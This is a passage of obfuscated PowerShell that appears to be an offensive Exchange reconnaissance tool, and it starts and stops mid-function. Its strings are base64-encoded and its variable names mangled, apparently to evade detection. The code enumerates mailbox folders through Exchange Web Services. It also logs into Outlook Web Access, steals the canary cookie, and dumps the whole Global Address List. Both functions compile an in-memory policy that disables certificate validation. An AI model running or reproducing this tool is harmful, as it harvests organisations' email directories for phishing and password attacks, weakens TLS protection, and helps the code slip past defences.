    $Mailbox = "",
    [Parameter(Position = 1, Mandatory = $false)]
    [system.URI]
    $ExchHostname = "",
    [Parameter(Position = 2, Mandatory = $False)]
    [string]
    $OutFile = "",
    [Parameter(Position = 3, Mandatory = $False)]
    [string]
    $ExchangeVersion = "Exchange2010",
    [Parameter(Position = 4, Mandatory = $False)]
    [switch]
    $Remote
  )
  __/=\_/==\___/\___
  echo $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwAqAF0AIABUAHIAeQBpAG4AZwAgAEUAeABjAGgAYQBuAGcAZQAgAHYAZQByAHMAaQBvAG4AIAAkAEUAeABjAGgAYQBuAGcAZQBWAGUAcgBzAGkAbwBuAA==')))
  ${____/====\/\/=\__} = [Microsoft.Exchange.WebServices.Data.ExchangeVersion]::$ExchangeVersion
  ${/==\/\_______/\/=} = New-Object Microsoft.Exchange.WebServices.Data.ExchangeService(${____/====\/\/=\__})
  if ($Remote)
  {
    ${_/==\__/====\__/=} = Get-Credential
    ${/==\/\_______/\/=}.UseDefaultCredentials = $false
    ${/==\/\_______/\/=}.Credentials = ${_/==\__/====\__/=}.GetNetworkCredential()
  }
  else
  {
    ${/==\/\_______/\/=}.UseDefaultCredentials = $true
  }
  ${/==\__/=\/\/=\_/=}=New-Object Microsoft.CSharp.CSharpCodeProvider
  ${/\_____/=\__/\__/}=${/==\__/=\/\/=\_/=}.CreateCompiler()
  ${__/\/\_/\_/\_/\__}=New-Object System.CodeDom.Compiler.CompilerParameters
  ${__/\/\_/\_/\_/\__}.GenerateExecutable=$False
  ${__/\/\_/\_/\_/\__}.GenerateInMemory=$True
  ${__/\/\_/\_/\_/\__}.IncludeDebugInformation=$False
  ${__/\/\_/\_/\_/\__}.ReferencedAssemblies.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwB5AHMAdABlAG0ALgBEAEwATAA=')))) > $null
  ${__/=\/\_/===\__/=}=$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('IAAgACAAIABuAGEAbQBlAHMAcABhAGMAZQAgAEwAbwBjAGEAbAAuAFQAbwBvAGwAawBpAHQARQB4AHQAZQBuAHMAaQBvAG4AcwAuAE4AZQB0AC4AQwBlAHIAdABpAGYAaQBjAGEAdABlAFAAbwBsAGkAYwB5AHsADQAKACAAIAAgACAAIAAgAHAAdQBiAGwAaQBjACAAYwBsAGEAcwBzACAAVAByAHUAcwB0AEEAbABsACAAOgAgAFMAeQBzAHQAZQBtAC4ATgBlAHQALgBJAEMAZQByAHQAaQBmAGkAYwBhAHQAZQBQAG8AbABpAGMAeQAgAHsADQAKACAAIAAgACAAIAAgACAAIABwAHUAYgBsAGkAYwAgAFQAcgB1AHMAdABBAGwAbAAoACkAIAB7ACAADQAKACAAIAAgACAAIAAgACAAIAB9AA0ACgAgACAAIAAgACAAIAAgACAAcAB1AGIAbABpAGMAIABiAG8AbwBsACAAQwBoAGUAYwBrAFYAYQBsAGkAZABhAHQAaQBvAG4AUgBlAHMAdQBsAHQAKABTAHkAcwB0AGUAbQAuAE4AZQB0AC4AUwBlAHIAdgBpAGMAZQBQAG8AaQBuAHQAIABzAHAALAANAAoAIAAgACAAIAAgACAAIAAgACAAIABTAHkAcwB0AGUAbQAuAFMAZQBjAHUAcgBpAHQAeQAuAEMAcgB5AHAAdABvAGcAcgBhAHAAaAB5AC4AWAA1ADAAOQBDAGUAcgB0AGkAZgBpAGMAYQB0AGUAcwAuAFgANQAwADkAQwBlAHIAdABpAGYAaQBjAGEAdABlACAAYwBlAHIAdAAsACAADQAKACAAIAAgACAAIAAgACAAIAAgACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFcAZQBiAFIAZQBxAHUAZQBzAHQAIAByAGUAcQAsACAAaQBuAHQAIABwAHIAbwBiAGwAZQBtACkAIAB7AA0ACgAgACAAIAAgACAAIAAgACAAIAAgAHIAZQB0AHUAcgBuACAAdAByAHUAZQA7AA0ACgAgACAAIAAgACAAIAAgACAAfQANAAoAIAAgACAAIAAgACAAfQANAAoAIAAgACAAIAB9AA=='))) 
  ${_/=\_/\_/=\___/\_}=${/==\__/=\/\/=\_/=}.CompileAssemblyFromSource(${__/\/\_/\_/\_/\__},${__/=\/\_/===\__/=})
  ${_/\_/======\__/==}=${_/=\_/\_/=\___/\_}.CompiledAssembly
  ${__/\_/==\________}=${_/\_/======\__/==}.CreateInstance($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABvAGMAYQBsAC4AVABvAG8AbABrAGkAdABFAHgAdABlAG4AcwBpAG8AbgBzAC4ATgBlAHQALgBDAGUAcgB0AGkAZgBpAGMAYQB0AGUAUABvAGwAaQBjAHkALgBUAHIAdQBzAHQAQQBsAGwA'))))
  [System.Net.ServicePointManager]::CertificatePolicy=${__/\_/==\________}
  if ($ExchHostname -ne "")
  {
    ($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwAqAF0AIABVAHMAaQBuAGcAIABFAFcAUwAgAFUAUgBMACAA'))) + $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('aAB0AHQAcABzADoALwAvAA=='))) + $ExchHostname + $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('LwBFAFcAUwAvAEUAeABjAGgAYQBuAGcAZQAuAGEAcwBtAHgA'))))
    ${/==\/\_______/\/=}.Url = new-object System.Uri(($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('aAB0AHQAcABzADoALwAvAA=='))) + $ExchHostname + $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('LwBFAFcAUwAvAEUAeABjAGgAYQBuAGcAZQAuAGEAcwBtAHgA')))))
  }
  else
  {
    ($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwAqAF0AIABBAHUAdABvAGQAaQBzAGMAbwB2AGUAcgBpAG4AZwAgAGUAbQBhAGkAbAAgAHMAZQByAHYAZQByACAAZgBvAHIAIAA='))) + $Mailbox + $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('LgAuAC4A'))))
    ${/==\/\_______/\/=}.AutoDiscoverUrl($Mailbox, {$true})
  }    
    echo ($ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwAqAF0AIABOAG8AdwAgAHMAZQBhAHIAYwBoAGkAbgBnACAAbQBhAGkAbABiAG8AeAA6ACAAJABNAGEAaQBsAGIAbwB4ACAAZgBvAHIAIABmAG8AbABkAGUAcgBzAC4A'))))
    ${/=\___/===\/=\_/=} = [Microsoft.Exchange.WebServices.Data.WellKnownFolderName]::MsgFolderRoot
    ${_/\___/=\___/===\} = New-Object Microsoft.Exchange.WebServices.Data.Mailbox( $Mailbox )
    ${/=\_______/=\___/} = New-Object Microsoft.Exchange.WebServices.Data.FolderId( ${/=\___/===\/=\_/=}, ${_/\___/=\___/===\})  
    ${/\_____/===\/\___} = [Microsoft.Exchange.WebServices.Data.Folder]::Bind(${/==\/\_______/\/=},${/=\_______/=\___/})
    ${/=======\/\/==\/\} = [Microsoft.Exchange.WebServices.Data.FolderView]100
    ${/=======\/\/==\/\}.Traversal=$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABlAGUAcAA=')))
    ${/\_____/===\/\___}.Load()
    ${__/==\_/=\/\/=\/=} = ${/\_____/===\/\___}.FindFolders(${/=======\/\/==\/\}) 
    ${__/\_/=\__/\___/\} = @()
    Foreach(${/=\____/=\/\/=\/\} in ${__/==\_/=\/\/=\/=})
    {
        echo "[***] Found folder: $(${/=\____/=\/\/=\/\}.DisplayName)"
        ${__/\_/=\__/\___/\} += ${/=\____/=\/\/=\/\}.DisplayName
    }
    echo ($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwAqAF0AIABBACAAdABvAHQAYQBsACAAbwBmACAA'))) + ${__/\_/=\__/\___/\}.count + $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('IABmAG8AbABkAGUAcgBzACAAdwBlAHIAZQAgAGQAaQBzAGMAbwB2AGUAcgBlAGQALgA='))))
    if ($OutFile -ne "")
    {
      ${__/\_/=\__/\___/\} | Out-File -Encoding ascii $OutFile
    }
}
function Get-GlobalAddressList{
  Param(
    [Parameter(Position = 0, Mandatory = $false)]
    [system.URI]
    $ExchHostname = "",
    [Parameter(Position = 1, Mandatory = $False)]
    [string]
    $OutFile = "",
    [Parameter(Position = 2, Mandatory = $False)]
    [string]
    $ExchangeVersion = "Exchange2010",
    [Parameter(Position = 3, Mandatory = $False)]
    [string]
    $UserName = "",
    [Parameter(Position = 4, Mandatory = $False)]
    [string]
    $Password = ""
  )
    ${/==\__/=\/\/=\_/=}=New-Object Microsoft.CSharp.CSharpCodeProvider
    ${/\_____/=\__/\__/}=${/==\__/=\/\/=\_/=}.CreateCompiler()
    ${__/\/\_/\_/\_/\__}=New-Object System.CodeDom.Compiler.CompilerParameters
    ${__/\/\_/\_/\_/\__}.GenerateExecutable=$False
    ${__/\/\_/\_/\_/\__}.GenerateInMemory=$True
    ${__/\/\_/\_/\_/\__}.IncludeDebugInformation=$False
    ${__/\/\_/\_/\_/\__}.ReferencedAssemblies.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwB5AHMAdABlAG0ALgBEAEwATAA=')))) > $null
    ${__/=\/\_/===\__/=}=$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('IAAgACAAIABuAGEAbQBlAHMAcABhAGMAZQAgAEwAbwBjAGEAbAAuAFQAbwBvAGwAawBpAHQARQB4AHQAZQBuAHMAaQBvAG4AcwAuAE4AZQB0AC4AQwBlAHIAdABpAGYAaQBjAGEAdABlAFAAbwBsAGkAYwB5AHsADQAKACAAIAAgACAAIAAgAHAAdQBiAGwAaQBjACAAYwBsAGEAcwBzACAAVAByAHUAcwB0AEEAbABsACAAOgAgAFMAeQBzAHQAZQBtAC4ATgBlAHQALgBJAEMAZQByAHQAaQBmAGkAYwBhAHQAZQBQAG8AbABpAGMAeQAgAHsADQAKACAAIAAgACAAIAAgACAAIABwAHUAYgBsAGkAYwAgAFQAcgB1AHMAdABBAGwAbAAoACkAIAB7ACAADQAKACAAIAAgACAAIAAgACAAIAB9AA0ACgAgACAAIAAgACAAIAAgACAAcAB1AGIAbABpAGMAIABiAG8AbwBsACAAQwBoAGUAYwBrAFYAYQBsAGkAZABhAHQAaQBvAG4AUgBlAHMAdQBsAHQAKABTAHkAcwB0AGUAbQAuAE4AZQB0AC4AUwBlAHIAdgBpAGMAZQBQAG8AaQBuAHQAIABzAHAALAANAAoAIAAgACAAIAAgACAAIAAgACAAIABTAHkAcwB0AGUAbQAuAFMAZQBjAHUAcgBpAHQAeQAuAEMAcgB5AHAAdABvAGcAcgBhAHAAaAB5AC4AWAA1ADAAOQBDAGUAcgB0AGkAZgBpAGMAYQB0AGUAcwAuAFgANQAwADkAQwBlAHIAdABpAGYAaQBjAGEAdABlACAAYwBlAHIAdAAsACAADQAKACAAIAAgACAAIAAgACAAIAAgACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFcAZQBiAFIAZQBxAHUAZQBzAHQAIAByAGUAcQAsACAAaQBuAHQAIABwAHIAbwBiAGwAZQBtACkAIAB7AA0ACgAgACAAIAAgACAAIAAgACAAIAAgAHIAZQB0AHUAcgBuACAAdAByAHUAZQA7AA0ACgAgACAAIAAgACAAIAAgACAAfQANAAoAIAAgACAAIAAgACAAfQANAAoAIAAgACAAIAB9AA=='))) 
    ${_/=\_/\_/=\___/\_}=${/==\__/=\/\/=\_/=}.CompileAssemblyFromSource(${__/\/\_/\_/\_/\__},${__/=\/\_/===\__/=})
    ${_/\_/======\__/==}=${_/=\_/\_/=\___/\_}.CompiledAssembly
    ${__/\_/==\________}=${_/\_/======\__/==}.CreateInstance($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABvAGMAYQBsAC4AVABvAG8AbABrAGkAdABFAHgAdABlAG4AcwBpAG8AbgBzAC4ATgBlAHQALgBDAGUAcgB0AGkAZgBpAGMAYQB0AGUAUABvAGwAaQBjAHkALgBUAHIAdQBzAHQAQQBsAGwA'))))
    [System.Net.ServicePointManager]::CertificatePolicy=${__/\_/==\________}
    $ErrorActionPreference = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwB0AG8AcAA=')))
    try
    {
        Write-Host -ForegroundColor $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('eQBlAGwAbABvAHcA'))) $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwAqAF0AIABGAGkAcgBzAHQAIAB0AHIAeQBpAG4AZwAgAHQAbwAgAGwAbwBnACAAZABpAHIAZQBjAHQAbAB5ACAAaQBuAHQAbwAgAE8AVwBBACAAdABvACAAZQBuAHUAbQBlAHIAYQB0AGUAIAB0AGgAZQAgAEcAbABvAGIAYQBsACAAQQBkAGQAcgBlAHMAcwAgAEwAaQBzAHQAIAB1AHMAaQBuAGcAIABGAGkAbgBkAFAAZQBvAHAAbABlAC4ALgAuAA==')))
        Write-Host -ForegroundColor $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('eQBlAGwAbABvAHcA'))) $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwAqAF0AIABUAGgAaQBzACAAbQBlAHQAaABvAGQAIAByAGUAcQB1AGkAcgBlAHMAIABQAG8AdwBlAHIAUwBoAGUAbABsACAAVgBlAHIAcwBpAG8AbgAgADMALgAwAA==')))
        ${_/=\/=====\__/\_/=} = ($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('aAB0AHQAcABzADoALwAvAA=='))) + $ExchHostname + $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('LwBvAHcAYQAvAGEAdQB0AGgALgBvAHcAYQA='))))
        ${_/===\__/==\_/\/==} = ($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('aAB0AHQAcABzADoALwAvAA=='))) + $ExchHostname + $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('LwBvAHcAYQAvAA=='))))
        ${___/\__/=\/\_/\__} = ($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('aAB0AHQAcABzADoALwAvAA=='))) + $ExchHostname + $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('LwBvAHcAYQAvAHMAZQByAHYAaQBjAGUALgBzAHYAYwA/AGEAYwB0AGkAbwBuAD0ARwBlAHQAUABlAG8AcABsAGUARgBpAGwAdABlAHIAcwA=')))) 
        ${/==\/\/\_/===\___} = ($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('aAB0AHQAcABzADoALwAvAA=='))) + $ExchHostname + $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('LwBvAHcAYQAvAHMAZQByAHYAaQBjAGUALgBzAHYAYwA/AGEAYwB0AGkAbwBuAD0ARgBpAG4AZABQAGUAbwBwAGwAZQA='))))
        echo $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwAqAF0AIABVAHMAaQBuAGcAIAAkAHsAZgAyAH0A')))
        ${/==\_/\/=\/=\_/\_} = @{destination=$ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JAB7AGYAMwB9AA==')));flags='4';forcedownlevel='0';username=$ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JABVAHMAZQByAE4AYQBtAGUA')));password=$ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JABQAGEAcwBzAHcAbwByAGQA')));isUtf8='1'}
        echo $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwAqAF0AIABMAG8AZwBnAGkAbgBnACAAaQBuAHQAbwAgAE8AVwBBAC4ALgAuAA==')))
        ${_/\/=\_/=\__/\/\/} = iwr -Uri ${_/=\/=====\__/\_/=} -Method POST -Body ${/==\_/\/=\/=\_/\_} -MaximumRedirection 0 -SessionVariable owasession -ErrorAction Ignore
        ${___/====\/=\/===\} = ${_/\/=\_/=\__/\/\/}.RawContent
        if (${___/====\/=\/===\} -like $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KgBjAGEAZABhAHQAYQAqAA=='))))
        {
            Write-Host -ForegroundColor $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZwByAGUAZQBuAA=='))) $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwAqAF0AIABPAFcAQQAgAEwAbwBnAGkAbgAgAGEAcABwAGUAYQByAHMAIAB0AG8AIABiAGUAIABzAHUAYwBjAGUAcwBzAGYAdQBsAC4A')))
        }
        else
        {
            Write-Host -ForegroundColor $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('cgBlAGQA'))) $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwAqAF0AIABPAFcAQQAgAGwAbwBnAGkAbgAgAGEAcABwAGUAYQByAHMAIAB0AG8AIABoAGEAdgBlACAAZgBhAGkAbABlAGQALgA=')))
            Write-Error ""
        }
        echo $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwAqAF0AIABSAGUAdAByAGkAZQB2AGkAbgBnACAATwBXAEEAIABDAGEAbgBhAHIAeQAuAC4ALgA=')))
        ${_/\__/=\/=\__/\/\} = iwr -Uri ${_/===\__/==\_/\/==} -Method GET -WebSession $owasession -ErrorAction SilentlyContinue
        ${/==\/=\__/\/=\___} = $owasession.Cookies.GetCookies(${_/=\/=====\__/\_/=})
        if (${/==\/=\__/\/=\___} -like $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KgBPAFcAQQAtAEMAQQBOAEEAUgBZACoA'))))
        {
            foreach (${/\____/===\/=\___} in ${/==\/=\__/\/=\___})
            {
                if (${/\____/===\/=\___} -like $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KgBjAGEAbgBhAHIAeQAqAA=='))))
                {
                    ${/=\/\___/\_/=\_/=} = ${/\____/===\/=\___}.value
                    if (${/=\/\___/\_/=\_/=})
                    {
                        Write-Host -ForegroundColor $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZwByAGUAZQBuAA=='))) "[*] Successfully retrieved the $(${/\____/===\/=\___}.name) cookie: $(${/\____/===\/=\___}.value)"
                    }
                    else
                    {
                        Write-Host -ForegroundColor $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('cgBlAGQA'))) $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwAqAF0AIABVAG4AYQBiAGwAZQAgAHQAbwAgAHIAZQB0AHIAaQBlAHYAZQAgAE8AVwBBACAAYwBhAG4AYQByAHkALgA=')))
                        Write-Error ""
                    }
                }
            }
        }
        else
        {
            Write-Host -ForegroundColor $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('cgBlAGQA'))) $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwAqAF0AIABVAG4AYQBiAGwAZQAgAHQAbwAgAHIAZQB0AHIAaQBlAHYAZQAgAE8AVwBBACAAYwBhAG4AYQByAHkALgA=')))
            Write-Error ""
        }
        echo $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwAqAF0AIABSAGUAdAByAGkAZQB2AGkAbgBnACAAQQBkAGQAcgBlAHMAcwBMAGkAcwB0AEkAZAAgAGYAcgBvAG0AIABHAGUAdABQAGUAbwBwAGwAZQBGAGkAbAB0AGUAcgBzACAAVQBSAEwALgA=')))
        ${____/\/\___/\/\/=} = iwr -Uri ${___/\__/=\/\_/\__} -Method POST -ContentType $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('YQBwAHAAbABpAGMAYQB0AGkAbwBuAC8AagBzAG8AbgA='))) -Body "{}" -Headers @{"X-OWA-CANARY"=$ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JAB7ADEAOQAwAH0A')));"Action"=$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RwBlAHQAUABlAG8AcABsAGUARgBpAGwAdABlAHIAcwA=')))} -WebSession $owasession
        ${____/=\__/\_/\__/} = @()
        ${____/=\__/\_/\__/} = ${____/\/\___/\/\/=}.RawContent
        ${___/\/=\/=\_/\_/\} = ${____/=\__/\_/\__/} -split $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('fQAsAHsA'))), 0, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('cwBpAG0AcABsAGUAbQBhAHQAYwBoAA=='))) 
        foreach(${______/=\/=\_/===} in ${___/\/=\/=\_/\_/\})
        {
            if (${______/=\/=\_/===} -like $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KgBHAGwAbwBiAGEAbAAgAEEAZABkAHIAZQBzAHMAIABMAGkAcwB0ACoA'))))
            {
                ${_/=\/\_/\_/\__/=\} = ${______/=\/=\_/===} -split $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABlAGYAYQB1AGwAdAAgAEcAbABvAGIAYQBsACAAQQBkAGQAcgBlAHMAcwAgAEwAaQBzAHQAIgAsACIARgBvAGwAZABlAHIASQBkACIAOgB7ACIAXwBfAHQAeQBwAGUAIgA6ACIAQQBkAGQAcgBlAHMAcwBMAGkAcwB0AEkAZAA6ACMARQB4AGMAaABhAG4AZwBlACIALAAiAEkAZAAiADoAIgA='))), 0, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('cwBpAG0AcABsAGUAbQBhAHQAYwBoAA==')))
                ${___/=\__/=\/\_/=\} = ${_/=\/\_/\_/\__/=\}[1] -split $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('IgB9ACwAIgBJAHMAUgBlAGEAZABPAG4AbAB5AA=='))), 0, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('cwBpAG0AcABsAGUAbQBhAHQAYwBoAA==')))
                ${/=\__/\_/\/\_/\/\} = ${___/=\__/=\/\_/=\}[0]
            }
        }
            if (${/=\__/\_/\/\_/\/\})
            {
                Write-Host -ForegroundColor $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZwByAGUAZQBuAA=='))) $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwAqAF0AIABHAGwAbwBiAGEAbAAgAEEAZABkAHIAZQBzAHMAIABMAGkAcwB0ACAASQBkACAAbwBmACAAJAB7ADEAOQAxAH0AIAB3AGEAcwAgAGYAbwB1AG4AZAAuAA==')))
            }
            else
            {
                Write-Host -ForegroundColor $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('cgBlAGQA'))) $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwAqAF0AIABGAGEAaQBsAGUAZAAgAHQAbwAgAGcAYQB0AGgAZQByACAAdABoAGUAIABHAGwAbwBiAGEAbAAgAEEAZABkAHIAZQBzAHMAIABMAGkAcwB0ACAASQBkAC4A')))
                Write-Error ""
            }
        ${_/\/=\/=\/====\__} = @()
        echo $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwAqAF0AIABOAG8AdwAgAHUAdABpAGwAaQB6AGkAbgBnACAARgBpAG4AZABQAGUAbwBwAGwAZQAgAHQAbwAgAHIAZQB0AHIAaQBlAHYAZQAgAEcAbABvAGIAYQBsACAAQQBkAGQAcgBlAHMAcwAgAEwAaQBzAHQA')))
        ${_/=\/==\/\_/====\} = iwr -Uri ${/==\/\/\_/===\___} -Method POST -ContentType $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('YQBwAHAAbABpAGMAYQB0AGkAbwBuAC8AagBzAG8AbgA='))) -Body $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ewAiAF8AXwB0AHkAcABlACIAOgAiAEYAaQBuAGQAUABlAG8AcABsAGUASgBzAG8AbgBSAGUAcQB1AGUAcwB0ADoAIwBFAHgAYwBoAGEAbgBnAGUAIgAsACIASABlAGEAZABlAHIAIgA6AHsAIgBfAF8AdAB5AHAAZQAiADoAIgBKAHMAbwBuAFIAZQBxAHUAZQBzAHQASABlAGEAZABlAHIAcwA6ACMARQB4AGMAaABhAG4AZwBlACIALAAiAFIAZQBxAHUAZQBzAHQAUwBlAHIAdgBlAHIAVgBlAHIAcwBpAG8AbgAiADoAIgBFAHgAYwBoAGEAbgBnAGUAMgAwADEAMwAiACwAIgBUAGkAbQBlAFoAbwBuAGUAQwBvAG4AdABlAHgAdAAiADoAewAiAF8AXwB0AHkAcABlACIAOgAiAFQAaQBtAGUAWgBvAG4AZQBDAG8AbgB0AGUAeAB0ADoAIwBFAHgAYwBoAGEAbgBnAGUAIgAsACIAVABpAG0AZQBaAG8AbgBlAEQAZQBmAGkAbgBpAHQAaQBvAG4AIgA6AHsAIgBfAF8AdAB5AHAAZQAiADoAIgBUAGkAbQBlAFoAbwBuAGUARABlAGYAaQBuAGkAdABpAG8AbgBUAHkAcABlADoAIwBFAHgAYwBoAGEAbgBnAGUAIgAsACIASQBkACIAOgAiAE0AbwB1AG4AdABhAGkAbgAgAFMAdABhAG4AZABhAHIAZAAgAFQAaQBtAGUAIgB9AH0AfQAsACIAQgBvAGQAeQAiADoAewAiAF8AXwB0AHkAcABlACIAOgAiAEYAaQBuAGQAUABlAG8AcABsAGUAUgBlAHEAdQBlAHMAdAA6ACMARQB4AGMAaABhAG4AZwBlACIALAAiAEkAbgBkAGUAeABlAGQAUABhAGcAZQBJAHQAZQBtAFYAaQBlAHcAIgA6AHsAIgBfAF8AdAB5AHAAZQAiADoAIgBJAG4AZABlAHgAZQBkAFAAYQBnAGUAVgBpAGUAdwA6ACMARQB4AGMAaABhAG4AZwBlACIALAAiAEIAYQBzAGUAUABvAGkAbgB0ACIAOgAiAEIAZQBnAGkAbgBuAGkAbgBnACIALAAiAE8AZgBmAHMAZQB0ACIAOgAwACwAIgBNAGEAeABFAG4AdAByAGkAZQBzAFIAZQB0AHUAcgBuAGUAZAAiADoAOQA5ADkAOQA5ADkAOQA5ADkAfQAsACIAUQB1AGUAcgB5AFMAdAByAGkAbgBnACIAOgBuAHUAbABsACwAIgBQAGEAcgBlAG4AdABGAG8AbABkAGUAcgBJAGQAIgA6AHsAIgBfAF8AdAB5AHAAZQAiADoAIgBUAGEAcgBnAGUAdABGAG8AbABkAGUAcgBJAGQAOgAjAEUAeABjAGgAYQBuAGcAZQAiACwAIgBCAGEAcwBlAEYAbwBsAGQAZQByAEkAZAAiADoAewAiAF8AXwB0AHkAcABlACIAOgAiAEEAZABkAHIAZQBzAHMATABpAHMAdABJAGQAOgAjAEUAeABjAGgAYQBuAGcAZQAiACwAIgBJAGQAIgA6ACIAJAB7ADEAOQAxAH0AIgB9AH0ALAAiAFAAZQByAHMAbwBuAGEAUwBoAGEAcABlACIAOgB7ACIAXwBfAHQAeQBwAGUAIgA6ACIAUABlAHIAcwBvAG4AYQBSAGUAcwBwAG8AbgBzAGUAUwBoAGEAcABlADoAIwBFAHgAYwBoAGEAbgBnAGUAIgAsACIAQgBhAHMAZQBTAGgAYQBwAGUAIgA6ACIARABlAGYAYQB1AGwAdAAiAH0ALAAiAFMAaABvAHUAbABkAFIAZQBzAG8AbAB2AGUATwBuAGUATwBmAGYARQBtAGEAaQBsAEEAZABkAHIAZQBzAHMAIgA6AGYAYQBsAHMAZQB9AH0A'))) -Headers @{"X-OWA-CANARY"=$ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JAB7ADEAOQAwAH0A')));"Action"=$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RgBpAG4AZABQAGUAbwBwAGwAZQA=')))} -WebSession $owasession
        ${__/=\/\/=\/==\/==} = @()
        ${__/=\/\/=\/==\/==} = ${_/=\/==\/\_/====\}.RawContent
        ${_/\/\__/\_/===\_/} = ${__/=\/\/=\/==\/==} -split $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('IgBFAG0AYQBpAGwAQQBkAGQAcgBlAHMAcwAiADoAIgA='))), 0, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('cwBpAG0AcABsAGUAbQBhAHQAYwBoAA==')))
        ${_/\/\__/\_/===\_/}[0] = ""
        ${_/\__/=\_____/\/\} = @()
        foreach (${__/====\/\__/\_/=} in ${_/\/\__/\_/===\_/})
        {
            if (${__/====\/\__/\_/=} -ne "")
            {
                ${_/\__/=\_____/\/\} += ${__/====\/\__/\_/=}
            }
        }
        foreach (${_/==\_/\_/\/\_/==} in ${_/\__/=\_____/\/\})
        {
            ${/=\__/\/=======\/} = ${_/==\_/\_/\/\_/==} -split $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('IgAsACIAUgBvAHUAdABpAG4AZwBUAHkAcABlACIA'))), 0, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('cwBpAG0AcABsAGUAbQBhAHQAYwBoAA==')))
            ${_/\/=\/=\/====\__} += ${/=\__/\/=======\/}[0]
        }
        echo $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwAqAF0AIABOAG8AdwAgAGMAbABlAGEAbgBpAG4AZwAgAHUAcAAgAHQAaABlACAAbABpAHMAdAAuAC4ALgA=')))
        ${_/\_/\__/\__/\/\/} = ${_/\/=\/=\/====\__} | sort | gu
        echo ${_/\_/\__/\__/\/\/}
